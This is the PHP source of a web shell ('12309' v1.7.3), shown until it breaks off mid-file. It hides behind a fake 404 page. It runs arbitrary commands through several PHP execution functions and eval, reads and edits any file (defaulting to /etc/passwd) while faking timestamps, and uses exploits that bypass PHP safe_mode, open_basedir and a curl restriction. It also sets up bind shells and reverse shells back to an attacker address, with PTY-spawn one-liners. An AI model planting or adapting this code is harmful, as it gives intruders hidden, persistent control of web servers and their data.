<?php
//th1s 1s ultr4l33t php websh3ll || uz3 1t f0r 3duc4t10n4l purp0zes 0nly :P
if(isset($_GET['pfs'])) {
 findsock();
}
session_start();
if(isset($_GET['l0g1n'])) {
 $_SESSION['l0g1n']=session_id();;
}
if(!isset($_SESSION['l0g1n'])) {
 header("Location: http://".$_SERVER['SERVER_NAME']."/404.html");
}
$ver="1.7.3";
// --------------------------------------------- globals 
error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time',0);
$descriptorspec = array(
 0 => array("pipe", "r"),
 1 => array("pipe", "w"),
 2 => array("pipe", "w")
);
$helpscript='<script type="text/javascript">function showTooltip(id)
{
 var myDiv = document.getElementById(id);
 if(myDiv.style.display == "none"){
  myDiv.style.display = "block";
 } else {
  myDiv.style.display = "none";
 }
 return false;
}</script>';
// --------------------------------------------- symbolic permissions 
function fperms($file)
{$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';}
elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';}elseif (($perms & 0x6000) == 0x6000) {$info = 'b';}elseif (($perms & 0x4000) == 0x4000) {$info = 'd';}elseif (($perms & 0x2000) == 0x2000) {$info = 'c';}elseif (($perms & 0x1000) == 0x1000) {$info = 'p';}else {$info = 'u';}$info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));$info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-');$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));return $info;}
// --------------------------------------------- clearing phpversion() 
function version() {
 $pv=explode(".",phpversion());
 if(eregi("-",$pv[2])) {
  $tmp=explode("-",$pv[2]);
  $pv[2]=$tmp[0];
 }
 $php_version_sort=$pv[0].".".$pv[1].".".$pv[2];
 return $php_version_sort;
}
// --------------------------------------------- recursive dir removal by Endeveit
function rmrf($dir)
{
    if ($objs = glob($dir."/*")) {
        foreach($objs as $obj) {
            is_dir($obj) ? rmrf($obj) : unlink($obj);
        }
    }
    rmdir($dir);
}
// --------------------------------------------- checking for enabled funcs
function function_enabled($func) {
 $disabled=explode(",",@ini_get("disable_functions")); 
 if (empty($disabled)) { 
  $disabled=array(); 
 } 
 else {  
  $disabled=array_map('trim',array_map('strtolower',$disabled)); 
 } 
 return (function_exists($func) && is_callable($func) && !in_array($func,$disabled) ); 
}
if (!function_enabled('shell_exec') and !function_enabled('proc_open') and !function_enabled('passthru') and !function_enabled('system') and !function_enabled('exec') and !function_enabled('popen')) {
 $failflag="1";
} else {
 $failflag="0";
}
// -------------------------------------------- php <= 5.2.9 curl bug
function sploent529($path) {
 if (!is_dir('file:')) {
  mkdir('file:');
 }
 $dirz=array();
 $a=array();
 $a=explode('/',$path);
 $c=count($a);
 $dir='file:/';
 $d=substr($dir,0,-1);
 if (!is_dir($d)) {
  mkdir($d); 
 }
 for ($i=0;$i<$c-1;++$i) {
  $dir.=$a[$i].'/';
  $d=substr($dir,0,-1);
  $dirz[]=$d;
  if (!is_dir($d)) {
   mkdir($d); 
  } 
 }
 if (!file_exists($path)) {
  $fp=fopen('file:/'.$path,'w');
  fclose($fp); 
 }
 $ch=curl_init();
 curl_setopt($ch,CURLOPT_URL,'file:file:////'.$path);
 curl_setopt($ch,CURLOPT_HEADER,0);
 if(FALSE==curl_exec($ch)) {
  echo ("    fail :( either there is no such file or exploit failed ");
  curl_close($ch);
  rmrf('file:');
  die();
 } else {
  curl_close($ch);
  rmrf('file:');
  return TRUE;
 }
}
// --------------------------------------------- php 5.1.6 ini_set bug
function sploent516() {
 //safe_mode check
 if (ini_get("safe_mode") =="1" || ini_get("safe_mode") =="On" || ini_get("safe_mode") ==TRUE) {
  ini_restore("safe_mode");
  if (ini_get("safe_mode") =="1" || ini_get("safe_mode") =="On" || ini_get("safe_mode") ==TRUE) {
   ini_set("safe_mode", FALSE);
   ini_set("safe_mode", "Off");
   ini_set("safe_mode", "0");
   if (ini_get("safe_mode") =="1" || ini_get("safe_mode") =="On" || ini_get("safe_mode") ==TRUE) {
    echo "<font color=\"red\">safe mode: ON</font><br>";
   } else {
    echo "<font color=\"green\">safe mode: OFF</font> || hello php-5.1.6 bugs<br>";
   }
  } else {
   echo "<font color=\"green\">safe mode: OFF</font> || hello php-5.1.6 bugs<br>";
  }
 } else {
  echo "<font color=\"green\">safe mode: OFF</font><br>";
 }
 //open_basedir check
 if (ini_get("open_basedir")=="Off" || ini_get("open_basedir")=="/" || ini_get("open_basedir")==NULL || strtolower(ini_get("open_basedir"))=="none") {
  echo "open_basedir: none<br>";
 } 
 else {
  ini_restore("open_basedir");
  if (ini_get("open_basedir")=="Off" || ini_get("open_basedir")=="/" || ini_get("open_basedir")==NULL ||  strtolower(ini_get("open_basedir"))=="none") {
   echo "open_basedir: none || hello php-5.1.6 bugs<br>";
  } 
  else {
   ini_set('open_basedir', '/'); 
   if (ini_get("open_basedir")=="/") {
    echo "open_basedir: / || hello php-5.1.6 bugs<br>";
   } 
   else {
    $basedir=TRUE;
   echo "open_basedir: ".ini_get("open_basedir");
   }
  }
 }
}
// --------------------------------------------- findsock
function findsock() {
 $VERSION = "1.0";
 echo "findsock start<br>  ";
 $c=getcwd()."/findsock ".$_SERVER['REMOTE_ADDR']." ".$_SERVER['REMOTE_PORT']."";
 if (function_enabled('shell_exec')) {
  shell_exec($c);
 } else if(function_enabled('passthru')) {
  passthru($c);
 } else if(function_enabled('system')) {
  system($c);
 } else if(function_enabled('exec')) {
  exec($c);
 } else if(function_enabled('proc_open')) {
  $handle=proc_open($c,$descriptorspec,$pipes);
  while (!feof($pipes[1])) {
   $buffer.=fread($pipes[1],1024);
  }
  @proc_close($handle);
 } else if(function_enabled('popen')) {
  $fp=popen($c,'r');
  @pclose($fp);
 }
 echo "  exiting  ";
 exit();
}
// --------------------------------------------- search for binary
function search($bin,$flag) {
 if ($flag=="1") { 
  $path="";
  return $path;
 } else {
  if (function_enabled('shell_exec')) {
   $path=trim(shell_exec('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in'));
  } else if(function_enabled('exec')) {
   $path=trim(exec('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in'));
  } else if(function_enabled('system')) {
   ob_start();
   system('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in');
   $path=trim(ob_get_contents());
   ob_end_clean();
  } else if (function_enabled('popen')) { 
   $hndl=popen('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in', "r");
   $path=trim(stream_get_contents($hndl));
   pclose($hndl);
  } else if(function_enabled('passthru')) {
   ob_start();
   passthru('export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin; which '.$bin.' 2>&1 | grep -v no.'.$bin.'.in');
   $path=trim(ob_get_contents());
   ob_end_clean();
  }
 }
 return $path;
}
// --------------------------------------------- print page 
$title='<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- made by vk/12309 || cheerz to Tidus, Shift, pekayoba, Zer0 || exploit.in f0r3v4 -->
<html>
 <head>
  <title>12309 '.$ver.'</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <style type="text/css">
   input {
    background-color: #202020;
    color: white;
    border: none;
   }
   input[type="submit"] {
    background-color: gray;
    color: white;
   }
   BODY {
    background-color: black;
    color: white; 
   }
  </style>
 </head>
 <body>'.$helpscript.'
  <b><a href="'.$_SERVER['PHP_SELF'].'?p=f">file operations</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=s">execute command</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=b">bind/backconnect</a></b> || <b><a href="'.$_SERVER['PHP_SELF'].'?p=e">extras</a></b><br><br>';

// --------------------------------------------- main code 
if (!isset($_GET['p'])) { $_GET['p']="s"; }
switch ($_GET['p']) {
 case "s":
  if (empty($_POST["wut"])) {
   echo $title;
   sploent516();
   if (ini_get("safe_mode")) {
    $failflag="1";
   }
   $shelltext=("uname -a");
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s">
  <font color="green"> haxor@pwnedbox$ </font><input name="command" type="text" maxlength="500" size="50" value="'.$shelltext.'"> <input type="submit" value="go"> <input type="checkbox" name="down"> download <br><br>';
   if ($failflag=="1") {
    echo "all system functions are disabled :( <font color=\"gray\"> but you could try a <a href=\"?p=e\">perl shell</a> ;) and still there are<br></font>"; } else {
    if (function_enabled('passthru')) {
     echo 'passthru <input name="wut" value="passthru" type="radio" checked><br>';
    } else { echo 'passthru is disabled!<br>';}
    if (function_enabled('system')) {
     echo 'system <input name="wut" value="system" type="radio"><br>';
    } else { echo 'system is disabled!<br>';}
    if (function_enabled('exec')) {
     echo 'exec <input name="wut" value="exec" type="radio"><br>';
    } else { echo 'exec is disabled!<br>';}
    if (function_enabled('shell_exec')) {
     echo 'shell_exec <input name="wut" value="shell_exec" type="radio"><br>';
    } else { echo 'shell_exec is disabled!<br>';}
    if (function_enabled('popen')) {
     echo 'popen <input name="wut" value="popen" type="radio"> <font color="gray"> (/bin/sh)</font><br>';
    } else { echo 'popen is disabled!<br>';}
    if (function_enabled('proc_open')) {
     echo 'proc_open <input name="wut" value="proc_open" type="radio"> <font color="gray"> (/bin/sh)</font><br>';
    } else { echo 'proc_open is disabled!<br>';} 
   }
   // eval almost always enabled, except there is special option in suhosin-patched php 
   echo 'php eval() <input name="wut" value="eval" type="radio"><br>';
   echo '</form>';
   echo "<br>pcntl_exec:";
   //determining if pcntl enabled is kinda tricky. debug: add if(dl('pcntl.so')) or check var_dump(get_extension_funcs('pcntl')) ?
   if (extension_loaded('pcntl')) {
    if (function_enabled('pcntl_fork')) {
     if (function_enabled('pcntl_exec')) {
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> <br><font color="green"> haxor@pwnedbox$ </font><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">"checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="./rezult.html"> ';
     if (is_writable("./")) {
      echo "<font color=\"green\">(./ writable)</font>";
     } else {
      echo "<font color=\"red\">(./ readonly)</font>";
     }
     echo '<br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
     } else {
      echo "<br>pcntl_exec is disabled!<br>";
     }
    } else {
     echo "<br>pcntl_fork is disabled!<br>";
    }
   } else {
    echo "<br>fail, no pcntl.so here<br>";
   }
   echo "<br>ssh2_exec:";
   if (extension_loaded('ssh2')) {
    if (function_enabled('ssh2_connect')) {
     if (function_enabled('ssh2_exec')) {
      if ($_POST["down"] != "on") {
       if (empty($_POST["wut"])) {
        echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"> <font color="gray">host: <input name="ssh2host" type="text" size="20" value="localhost"> port: <input name="ssh2port" type="text" size="5" maxlength="5" value="22"> user: <input name="ssh2user" type="text" size="20" value="h4x0r"> password: <input name="ssh2pass" type="text" size="20" value="r0xx0r"> </font><br><font color="green"> haxor@pwnedbox$ </font><input name="command" type="text" size="40" value="uname -a"> <input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="ssh2"></form>';
       }
      }
     } else {
      echo "<br>ssh2_exec is disabled!";
     }
    } else {
     echo "<br>ssh2_connect is disabled!";
    }
   } else {
    echo "<br>fail, no ssh2.so here";
   }
   echo "</body></html>";
  } else {
   if ($_POST["down"] != "on") {
    echo $title;
   }
   $shelltext=stripslashes($_POST["command"]);
   $html='<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="green"> haxor@pwnedbox$ </font>';
   $input='<input name="command" type="text" maxlength="500" size="50" value="'.htmlspecialchars($shelltext, ENT_QUOTES, "UTF-8").'"> 2>&1 <input type="submit" value="Enter"> <input type="checkbox" name="down"> download <input name="wut" type="hidden" value="';
   if ($_POST["down"] != "on") {
   switch ($_POST["wut"]) {
    case "passthru":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'passthru"></form>';
     break;
    case "system":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'system"></form>';
     break;
    case "exec":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'exec"></form>';
     break;
    case "shell_exec":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'shell_exec"></form>';
     break;
    case "popen":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'popen"></form>';
     break;
    case "proc_open":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'proc_open"></form>';
     break;
    case "eval":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo 'php -r \''; echo '<input name="command" type="text" maxlength="500" size="50" value="'.htmlspecialchars($shelltext, ENT_QUOTES, "UTF-8").'"> \' <input type="submit" value="Enter">
     <input name="wut" value="eval" type="hidden"></form>';
     break;
    case "pcntl":
     //sploent516 not needed coz pcntl bypasses safe_mode
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> <br><font color="green"> haxor@pwnedbox$ </font><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">"checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="'.$_POST["pcfile"].'">';
     if (is_writable("./")) {
      echo "<font color=\"green\">(./ writable)</font>";
     } else {
      echo "<font color=\"red\">(./ readonly)</font>";
     }
     echo ' <br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
     break;
    case "ssh2":
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=s"><font color="gray"> host: <input name="ssh2host" type="text" size="20" value="'.$_POST["ssh2host"].'"> port: <input name="ssh2port" type="text" size="5" maxlength="5" value="'.$_POST["ssh2port"].'"> user: <input name="ssh2user" type="text" size="20" value="'.$_POST["ssh2user"].'"> password: <input name="ssh2pass" type="text" size="20" value="'.$_POST["ssh2pass"].'"> </font><br><font color="green"> haxor@pwnedbox$ </font> <input name="command" type="text" size="40" value="'.$shelltext.'"> <input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="ssh2"></form>';
     break;
    case "sql":
     header('Location: '.$_SERVER['PHP_SELF'].'?p=ms');
     break;
   }
   }
  }
  if (!empty($_POST["wut"])) {
   if ($_POST["down"] == "on") {
    header("Content-Type: application/force-download");
    header("Content-Type: application/octet-stream");
    header("Content-Type: application/download");
    header("Accept-Ranges: bytes");
    header('Content-Disposition: attachment; filename="result.txt"');
   }
   if ($_POST["down"] != "on") {
    echo "<textarea cols=\"80\" rows=\"40\" style=\"background: black; color: gray;\">";
   }
   switch ($_POST["wut"]) {
    case "passthru":
     passthru(stripslashes($_POST["command"]." 2>&1"));
     break;
    case "system":
     system(stripslashes($_POST["command"]." 2>&1"));
     break;
    case "exec":
     exec(stripslashes($_POST["command"]." 2>&1",$out));
     print_r($out);
     break;
    case "shell_exec":
     $out=shell_exec(stripslashes($_POST["command"]." 2>&1"));
     echo "$out";
     break;
    case "popen":
     $hndl=popen(stripslashes($_POST["command"]." 2>&1", "r"));
     $read=stream_get_contents($hndl);
     echo $read;
     pclose($hndl);
     break;
    case "proc_open":
     $process = proc_open('/bin/sh', $descriptorspec, $pipes);
     if (is_resource($process)) {
      fwrite($pipes[0],stripslashes($_POST["command"]));
      fclose($pipes[0]);
      echo stream_get_contents($pipes[1]);
      fclose($pipes[1]);
      echo stream_get_contents($pipes[2]);
      fclose($pipes[2]);
      @proc_close($process);
     }
     break;
    case "pcntl":
     $shelltext=stripslashes($_POST["command"]);
     switch (pcntl_fork()) {
      case 0:
       pcntl_exec($_POST["inter"],array("-c","".$_POST["command"]." ".$_POST["to"]." ".$_POST["pcfile"]));
       exit(0);
      default:
       break;
     }
     sleep(1);
     $fh=fopen("".$_POST["pcfile"]."","r");
     if (!$fh) { echo "can`t fopen ".$_POST["pcfile"].", seems that we failed :("; }
     else {
      $rezult=fread($fh,filesize($_POST["pcfile"]));
      fclose($fh);
      echo $rezult;
      if ($_POST["delrezult"] == "on") { unlink($_POST["pcfile"]); }
     }
     break;
    case "eval":
     eval(stripslashes($_POST["command"]));
     break;
    case "ssh2":
     $connection=ssh2_connect($_POST["ssh2host"], $_POST["ssh2port"]) or die ("cant connect. host/port wrong?");
     //using knowingly wrong username to test auth. methods
     $auth_methods = ssh2_auth_none($connection, '12309tezt');
     if (in_array('password', $auth_methods)) {
      $connection=ssh2_connect($_POST["ssh2host"], $_POST["ssh2port"]) or die ("cant connect. host/port wrong?"); //need to connect again after failed login
      if (ssh2_auth_password($connection, ''.$_POST["ssh2user"].'', ''.$_POST["ssh2pass"].'')) {
       $stream=ssh2_exec($connection, $shelltext); 
       stream_set_blocking($stream, true);
       $data = "";
       while ($buf = fread($stream,4096)) {
        $data .= $buf;
       }
       fclose($stream);
       echo $data;
      } else {
       echo "cant login. user/pass wrong?";
      }
     } else {
      echo 'fail, no "password" auth method';
     }     
     break;
   }
   if ($_POST["down"] != "on") {
    echo "</textarea>";
   }
  }
 break; 
// --------------------------------------------- shell end; sql
//TODO: sql!
 case "ms":
 echo $title;
 //
 if (!empty($_POST['sq'])) {
  echo "todo";
 }
 break;
// --------------------------------------------- sql end; file operations
 case "f":
  if (empty($_POST["down"])) {
   echo $title;
   echo '<font color="blue">---> read file </font><br>';
   echo "<font color=\"gray\">";
   echo "current dir: ".$_SERVER["DOCUMENT_ROOT"]."<br>";
   sploent516();
   echo "<br>--------------------------------<br></font>";
  }
  if (empty($_POST["filer"])) {
   $ololotext="/home/USER/public_html/DOMAIN/index.php";
   echo "php file_get_contents:<br>";
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green"> haxor@pwnedbox$</font> cat <input name="filename" type="text" maxlength="500" size="50" value="'.$ololotext.'">
   <input name="filer" type="hidden" value="php"><input type="submit" value="Enter"> <input type="checkbox" name="down"> download </form>';
   //curl
   if (strnatcmp(version(),"5.2.9") <= 0) {
    echo "<br> curl exploit: <br>";
    if (!extension_loaded('curl')) {
     echo "&nbsp;&nbsp;fail, curl is required<br>";
    } else {
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green"> haxor@pwnedbox$</font> cat <input name="filename" type="text" maxlength="500" size="50" value="'.$ololotext.'">
     <input name="filer" type="hidden" value="curl"><input type="submit" value="Enter"> <input type="checkbox" name="down"> download </form>';
    }
   }
  } else {
   switch ($_POST["filer"]) {
    case "php":
     if ($_POST["down"] == "on") {
      header("Content-Type: application/force-download");
      header("Content-Type: application/octet-stream");
      header("Content-Type: application/download");
      header("Accept-Ranges: bytes");
      header('Content-Disposition: attachment; filename="result.txt"');
     }
     $ololotext=($_POST["filename"]);
     if (empty($_POST["down"])) {
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green">haxor@pwnedbox$ </font>cat
      <input name="filename" type="text" maxlength="500" size="50" value="'.$ololotext.'">
      <input name="filer" type="hidden" value="php"><input type="submit" value="Enter"><input type="checkbox" name="down"> download </form>';
     }
     if (!empty($_POST["filename"])) { 
      if (empty($_POST["down"])) {
       echo '<font color="gray">';
       echo "<textarea cols=\"80\" rows=\"40\" style=\"background: black; color: gray;\">";
      }
      $contents=file_get_contents($_POST["filename"]) or die("failed. bad permissions or no such file?");
      echo $contents;
      if (empty($_POST["down"])) {
       echo "</textarea>";
      }
      die(); 
     }
     break;  
    case "curl":
     if ($_POST["down"] == "on") {
      header("Content-Type: application/force-download");
      header("Content-Type: application/octet-stream");
      header("Content-Type: application/download");
      header("Accept-Ranges: bytes");
      header('Content-Disposition: attachment; filename="result.txt"');
     }
     $ololotext=($_POST["filename"]);
     if (empty($_POST["down"])) {
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><font color="green">haxor@pwnedbox$ </font>cat
      <input name="filename" type="text" maxlength="500" size="50" value="'.$ololotext.'">
      <input name="filer" type="hidden" value="curl"><input type="submit" value="Enter"><input type="checkbox" name="down"> download </form>';
     }
     if (!empty($_POST["filename"])) { 
      if (empty($_POST["down"])) {
       echo '<font color="gray">';
       echo "<textarea cols=\"80\" rows=\"40\" style=\"background: black; color: gray;\">";
      }
      sploent529($_POST["filename"]);
     }
    break;
   case "edit":
    $filee=trim($_POST["filee"]);
    $oldtime=@filemtime($filee);
    $files=trim($_POST["files"]);
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f">edit file <input name="filee" type="text" maxlength="500" size="40" value="'.$filee.'"> save as <input name="files" type="text" maxlength="500" size="40" value="'.$files.'"> <input type="submit" value="go"><input name="filer" type="hidden" value="edit"><input name="edt" type="hidden" value="ok"><br></form>';
    if (!is_writable($files)) {
     echo '<font color="red">'.$files.' isnt writable!</font>';
    } else {
     echo '<font color="gray"> i will try to touch '.$files.' to '.date("Y-m-d H:i:s",$oldtime).'</font>';
    }
    if (!empty($_POST["edt"])) {
     $filec=file_get_contents($filee) or die ('<font color="red">cannot get contents!</font>');
     if (isset($_POST['filec'])) {
      $filec=$_POST['filec'];
      $fh=fopen($files,"w") or die ('<font color="red">cannot fopen "w"!</font>');
      fputs($fh,$filec);
      fclose($fh) or die ('<font color="red">cannot save file!</font>');
      @touch($files,$oldtime,$oldtime);
      die ('<font color="green"> -&gt '.$files.' saved!</font>');
     }
     echo '<form action="'.$_SERVER["PHP_SELF"].'?p=f" method="post"><textarea cols="80" rows="20" style="background: black; color: gray;" name="filec">'.$filec.'</textarea><input name="filee" type="hidden" value="'.$filee.'"><input name="files" type="hidden" value="'.$files.'"><input name="filer" type="hidden" value="edit"><br><input type="submit" name="edt" value="save"></form>';
    }
    die();
    break;
   }
  }
  // curl + file_get_contents end
  // upload
   echo '<br><font color="blue">---> upload file</font><br>';
   if (!ini_get('file_uploads')) {
    echo "file_uploads Off";
   } else {
    echo "<font color=\"gray\">post_max_size: ".ini_get('post_max_size')."<br>"; 
    echo "upload_max_filesize: ".ini_get('upload_max_filesize')."<br>"; 
    echo "</font>";
    echo '<form enctype="multipart/form-data" action="'.$_SERVER['PHP_SELF'].'?p=f" method="post"><input name="filename" type="file">  <input type="submit" value="upload to" /> <input name="filepath" type="text" maxlength="500" size="20" value="./"> <input name="upload" type="hidden" value="okz">';
    if (is_writable("./")) {
     echo "<font color=\"green\">(./ writable)</font>";
    } else {
     echo "<font color=\"red\">(./ readonly)</font>";
    }
    echo '</form>';
    if (!empty($_POST["upload"])) {
     if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
     {
       if (!move_uploaded_file($_FILES["filename"]["tmp_name"], $_POST['filepath']."".$_FILES["filename"]["name"])) {
        echo "<br>fukken failed<br>";
       } else {
        echo "<br>upload done</br>";
       }
     } else {
        echo("<br>fukken failed<br>");
     }
    }
   }
   echo "<br>";
   echo '<font color="blue">---> edit file</font><br>';
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=f"><input name="filee" type="text" maxlength="500" size="30" value="/etc/passwd"> save as <input name="files" type="text" maxlength="500" size="30" value=".passwd"> <input type="submit" value="go"><input name="edt" type="hidden" value="ok"><input name="filer" type="hidden" value="edit"><br></form>';
   echo "<br>";
   echo '<font color="blue">---> current dir</font><br>';
   echo "<textarea cols=\"80\" rows=\"20\" style=\"background: black; color: gray;\">";
   foreach (glob("{,.}*", GLOB_BRACE) as $filename) {
    echo "".$filename." -> size ".filesize($filename)." -> chmod ".substr(sprintf('%o',fileperms($filename)), -4)." (".fperms($filename).")\n";
   }
   echo "</textarea><br>";
  break;
// --------------------------------------------- file end; bind
 case "b":
  echo $title;
  echo '<a href="javascript:;" onclick="showTooltip(1)" id="link"> &gt;&gt; help &lt;&lt; </a>
  <div id="1" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">
  you could get almost-interactive shell in bind/backconnect with help of these commands<br>
  -&gt; if there is python on the server, run: <br>
  python -c \'import pty; pty.spawn("/bin/bash")\'<br>
  -&gt; ruby:<br>
  ruby -rpty -e \'PTY.spawn("/bin/bash")do|i,o|Thread.new do loop do o.print STDIN.getc.chr end end;loop do print i.sysread(512);STDOUT.flush end end\'<br>
  -&gt; expect:<br>
  expect -c \'spawn sh;interact\'<br>
  -&gt; policycoreutils package:<br>
  open_init_pty bash<br><br>
  //thanks to tex from rdot.org
  </div><br><br>';
  if ($failflag=="1") {
   echo "fail, at least one system function needed!<br><br>";
  } else {
   $nc='<font color="gray">(dont forget to setup nc <b>first</b>!)</font>';
   $semi='<font color="gray">dont forget to write <b>;</b> at the end of command!</font>';
   sploent516();
   echo "<br>";
   echo '<font color="blue">---> PHP </font><br>';
   if (!function_enabled('set_time_limit')) { echo '<font color="gray">warning! set_time_limit off!</font><br>'; }
   if (!function_enabled('ignore_user_abort')) { echo '<font color="gray">warning! ignore_user_abort off!</font><br>'; }
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> <input type="submit" value="go"><br>'.$semi.'<input name="shellz" type="hidden" value="phplocal"></form>';
   if (function_enabled('fsockopen')) {
    if (function_enabled('proc_open')) {
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> <input type="submit" value="go"><br>'.$nc.'<input name="shellz" type="hidden" value="phpremote"></form><br>';
    } else { echo 'fail, proc_open is needed for backconnect!<br><br>'; }
   } else { echo 'fail, fsockopen is needed for backconnect!<br><br>'; }
   //php end
   echo '<font color="blue">---> PERL </font><br>';
   if (@is_null(search("perl",$failflag))) {
    echo "fail, no perl here<br>";
   } else {
     if (@search("perl",$failflag)=="perm") {
     echo "fail, bad permissions<br>";
    } else {
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bd"> <input type="submit" value="go"><input name="shellz" type="hidden" value="perllocal"> ';
     if (is_writable("./")) {
      echo "<font color=\"green\">(./ writable)</font>";
     } else {
      echo "<font color=\"red\">(./ readonly)</font>";
     }
     echo '<br>'.$semi.'</form>';
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bc"> <input type="submit" value="go"><input name="shellz" type="hidden" value="perlremote"><br>'.$nc.'<br></form>';
    }
   }
   //perl end
   echo "<br>";
   echo '<font color="blue">---> PYTHON </font><br>';
   if (@is_null(search("python",$failflag))) {
    echo "fail, no python here<br>";
   } else {
     if (@search("python",$failflag)=="perm") {
     echo "fail, bad permissions<br>";
    } else {
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">bind local port <input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bd"> <input type="submit" value="go"><input name="shellz" type="hidden" value="pylocal"> ';
     if (is_writable("./")) {
      echo "<font color=\"green\">(./ writable)</font>";
     } else {
      echo "<font color=\"red\">(./ readonly)</font>";
     }
     echo '<br>'.$semi.'</form>';
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=b">backconnect to <input name="ip" type="text" maxlength="15" size="15" style="color: green;" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" style="color: green;" value="1337"> saving file to <input name="path" type="text" maxlength="500" size="10" style="color: green;" value="./.bc"> <input type="submit" value="go"><input name="shellz" type="hidden" value="pyremote"><br>'.$nc.'<br></form>';
